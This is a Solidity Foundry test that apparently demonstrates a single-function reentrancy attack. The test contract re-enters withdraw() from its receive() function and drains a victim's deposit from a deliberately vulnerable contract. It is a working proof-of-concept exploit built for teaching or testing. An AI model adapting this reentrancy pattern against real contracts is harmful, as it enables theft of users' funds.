// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {Vulnerable} from "../../src/reentrancy/1_SingleFunction.sol";

contract VulnerableTest is Test {
    Vulnerable public vulnerable;
    address public user = address(0x1);
    uint256 public callCount;

    function setUp() public {
        vulnerable = new Vulnerable();
        vm.deal(user, 10 ether);
        vm.deal(address(this), 1 ether);
    }

    receive() external payable {
        if (callCount < 5 && address(vulnerable).balance >= 1 ether) {
            callCount++;
            console.log("Reentering withdraw() - call count:", callCount);
            vulnerable.withdraw();
        }
    }

    function testReentrancyVulnerability() public {
        // Victim deposits funds
        vm.prank(user);
        vulnerable.deposit{value: 5 ether}();

        // Attacker deposits initial funds
        vulnerable.deposit{value: 1 ether}();

        // Initial balances
        uint256 initialContractBalance = address(vulnerable).balance;
        uint256 initialAttackerBalance = address(this).balance;

        // Attack begins
        vulnerable.withdraw();
        // Final balances
        console.log("\nFinal Contract Balance:", address(vulnerable).balance / 1e18, "ETH");
        console.log("Final Attacker Balance:", address(this).balance / 1e18, "ETH");
        console.log("Total reentrant calls:", callCount);

        // Assertions
        assertGt(
            address(this).balance, initialAttackerBalance, "Attacker should have more ETH than initially deposited"
        );

        assertLt(address(vulnerable).balance, initialContractBalance, "Contract should have less ETH after attack");

        assertGt(callCount, 0, "Reentrancy should have occurred");
    }
}
